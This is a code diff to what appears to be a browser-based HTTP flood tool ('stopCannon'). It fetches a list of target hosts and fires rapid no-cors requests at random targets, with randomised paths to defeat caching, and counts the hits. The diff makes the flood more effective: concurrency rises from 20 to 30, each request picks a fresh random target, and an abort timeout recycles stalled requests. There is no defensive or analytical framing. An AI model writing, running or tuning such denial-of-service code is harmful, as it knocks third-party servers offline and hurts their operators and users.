@@ -1,4 +1,6 @@
 (function () {
+  var timeout = 5000;
+
   var elements = {
     btnStart: document.getElementById("btnAction"),
     btnStop: document.getElementById("btnStop"),
@@ -43,7 +45,7 @@
   };
 
   var getMaxConcurrent = function () {
-    return 20;
+    return 30;
   }
 
   window.stopCannon = function() {
@@ -67,16 +69,28 @@
 
     getTargets(function (targets) {
       function fireRequests() {
-        var target = targets[Math.floor(Math.random() * targets.length)];
         function fire() {
+          var target = targets[Math.floor(Math.random() * targets.length)];
           if (!isActive) { return }
           counter.total++;
           var rand = `${Math.floor(Math.random() * 1000000)}-${new Date().getTime()}`;
           refreshCounter();
-          fetch(`https://${target.host}:${target.port}/${(target.path || '').replace('{rand}', rand)}`, {
-            method: target.method || 'GET',
-            mode: "no-cors",
-          }).finally(function (err) {
+
+
+          var url = `https://${target.host}:${target.port}/${(target.path || '').replace('{rand}', rand)}`;
+          var method = target.method || 'GET';
+          new Promise((resolve, reject) => {
+            let controller = new AbortController();
+            fetch(url, {
+              method,
+              signal: controller.signal,
+              timeout: 5000,
+              mode: "no-cors",
+            }).then(resolve).catch(reject)
+            setTimeout(() => {
+              controller.abort()
+            }, timeout)
+          }).finally(function () {
             counter.hit++;
             refreshCounter();
             // TODO until done
